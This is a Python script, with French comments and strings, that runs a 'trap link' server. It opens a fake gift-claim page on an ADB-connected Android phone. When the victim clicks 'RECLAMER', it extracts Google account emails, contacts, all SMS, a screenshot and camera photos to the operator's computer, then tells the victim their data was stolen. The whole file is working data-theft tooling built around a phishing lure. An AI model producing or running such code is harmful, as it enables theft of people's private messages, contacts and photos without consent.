#!/usr/bin/env python3
"""
SERVEUR SIMPLE - LIEN PIEGE
"""
import http.server
import socketserver
import subprocess
import os
import json
import threading
from datetime import datetime

PORT = 9999
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT = r"C:\Users\davis\OneDrive\Bureau\HACKING\DONNEES_LIEN"

def adb(cmd):
    try:
        r = subprocess.run(f'"{ADB}" {cmd}', shell=True, capture_output=True, text=True, timeout=60, encoding='utf-8', errors='replace')
        return r.stdout
    except:
        return ""

def extract():
    print("\n" + "🔴"*30)
    print("   EXTRACTION DECLENCHEE!")
    print("🔴"*30 + "\n")
    
    os.makedirs(OUTPUT, exist_ok=True)
    os.makedirs(f"{OUTPUT}/Photos", exist_ok=True)
    
    # 1. System
    print("[1] Infos systeme...")
    model = adb("shell getprop ro.product.model").strip()
    print(f"    Model: {model}")
    
    # 2. Comptes
    print("[2] Comptes Google...")
    acc = adb("shell dumpsys account")
    emails = []
    for l in acc.split("\n"):
        if "Account {" in l and "com.google" in l:
            s = l.find("name=") + 5
            e = l.find(",", s)
            if e > s:
                em = l[s:e]
                if "@" in em and em not in emails:
                    emails.append(em)
                    print(f"    {em}")
    
    with open(f"{OUTPUT}/emails.txt", "w") as f:
        f.write("\n".join(emails))
    
    # 3. Contacts
    print("[3] Contacts...")
    contacts = adb("shell content query --uri content://contacts/phones")
    cnt = contacts.count("Row:")
    print(f"    {cnt} contacts")
    with open(f"{OUTPUT}/contacts.txt", "w", encoding="utf-8") as f:
        f.write(contacts)
    
    # 4. SMS
    print("[4] SMS...")
    sms = adb("shell content query --uri content://sms")
    sms_cnt = sms.count("Row:")
    print(f"    {sms_cnt} SMS")
    with open(f"{OUTPUT}/sms.txt", "w", encoding="utf-8") as f:
        f.write(sms)
    
    # 5. Screenshot
    print("[5] Screenshot...")
    adb("shell screencap -p /sdcard/x.png")
    adb(f'pull /sdcard/x.png "{OUTPUT}/screenshot.png"')
    adb("shell rm /sdcard/x.png")
    print("    Capture OK")
    
    # 6. Photos
    print("[6] Photos...")
    photos = adb("shell ls /sdcard/DCIM/Camera/ | head -3")
    for p in photos.split("\n"):
        if p.strip():
            adb(f'pull "/sdcard/DCIM/Camera/{p.strip()}" "{OUTPUT}/Photos/{p.strip()}"')
            print(f"    {p.strip()}")
    
    print("\n" + "="*50)
    print("EXTRACTION TERMINEE!")
    print(f"Dossier: {OUTPUT}")
    print("="*50)
    
    os.startfile(OUTPUT)
    
    return {"model": model, "emails": len(emails), "contacts": cnt, "sms": sms_cnt}

PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cadeau!</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;padding:20px}
.box{background:#fff;border-radius:20px;padding:30px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
h1{color:#333;font-size:24px}
.gift{font-size:60px}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin-top:20px;cursor:pointer}
.loading{display:none}
.show{display:block}
</style>
</head>
<body>
<div class="box">
<div class="gift">🎁</div>
<h1>Felicitations!</h1>
<p>Vous avez gagne un cadeau!</p>
<button class="btn" id="btn" onclick="go()">RECLAMER</button>
<div class="loading" id="load">⏳ Chargement...</div>
</div>
<script>
function go(){
document.getElementById('btn').style.display='none';
document.getElementById('load').className='loading show';
fetch('/steal').then(r=>r.json()).then(d=>{
document.getElementById('load').innerHTML='✅ Vos donnees ont ete volees!';
});
}
</script>
</body>
</html>"""

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/trap":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(PAGE.encode('utf-8'))
            print(f"🎯 Page affichee!")
        elif self.path == "/steal":
            print("🔴 CLIC DETECTE!")
            result = extract()
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, f, *a): pass

print("""
╔════════════════════════════════════════╗
║   🔴 SERVEUR LIEN PIEGE - PORT 9999   ║
╚════════════════════════════════════════╝
""")

# Verifier telephone
if "device" not in adb("devices"):
    print("❌ Telephone non connecte!")
    exit()

print("✅ Telephone connecte")

# Port forwarding
subprocess.run(f'"{ADB}" reverse tcp:9999 tcp:9999', shell=True)
print("✅ Port forwarding OK")

# Demarrer serveur
print(f"\n🌐 Serveur demarre sur port {PORT}")
print(f"📱 Lien: http://localhost:9999/")

# Ouvrir sur telephone
print("\n📱 Ouverture sur telephone...")
subprocess.run(f'"{ADB}" shell am start -a android.intent.action.VIEW -d http://localhost:9999/', shell=True)

print("\n⏳ Attente du clic...")
print("   Clique sur RECLAMER sur ton telephone!\n")

with socketserver.TCPServer(("", PORT), H) as s:
    s.serve_forever()
